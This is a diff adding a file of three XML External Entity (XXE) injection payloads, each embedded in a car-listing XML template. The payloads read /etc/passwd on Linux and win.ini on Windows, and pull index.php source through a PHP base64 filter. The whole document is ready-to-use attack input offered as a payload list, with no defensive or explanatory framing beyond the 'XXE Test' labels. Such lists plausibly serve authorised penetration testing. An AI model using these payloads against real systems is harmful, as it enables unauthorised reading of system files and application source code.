@@ -1,0 +1,62 @@
+<!-- Basic Local File Read (Linux) -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE car [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<car>
+    <brand>&xxe;</brand>
+    <model>Camry XSE</model>
+    <year>2024</year>
+    <color>Midnight Black Metallic</color>
+    <price>34999</price>
+    <engine>2.5L 4-Cylinder Hybrid</engine>
+    <horsepower>208 HP</horsepower>
+    <fuel_economy>44 MPG Combined</fuel_economy>
+    <transmission>8-Speed Automatic</transmission>
+    <features>
+        <feature>Panoramic Sunroof</feature>
+    </features>
+    <description>XXE Test</description>
+</car>
+
+<!-- Basic Local File Read (Windows) -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE car [
+  <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
+]>
+<car>
+    <brand>&xxe;</brand>
+    <model>Camry XSE</model>
+    <year>2024</year>
+    <color>Midnight Black Metallic</color>
+    <price>34999</price>
+    <engine>2.5L 4-Cylinder Hybrid</engine>
+    <horsepower>208 HP</horsepower>
+    <fuel_economy>44 MPG Combined</fuel_economy>
+    <transmission>8-Speed Automatic</transmission>
+    <features>
+        <feature>Panoramic Sunroof</feature>
+    </features>
+    <description>XXE Test</description>
+</car>
+
+<!-- PHP Filter Chain (Base64 Encode) -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE car [
+  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
+]>
+<car>
+    <brand>&xxe;</brand>
+    <model>Camry XSE</model>
+    <year>2024</year>
+    <color>Midnight Black Metallic</color>
+    <price>34999</price>
+    <engine>2.5L 4-Cylinder Hybrid</engine>
+    <horsepower>208 HP</horsepower>
+    <fuel_economy>44 MPG Combined</fuel_economy>
+    <transmission>8-Speed Automatic</transmission>
+    <features>
+        <feature>Panoramic Sunroof</feature>
+    </features>
+    <description>XXE Test</description>
+</car>
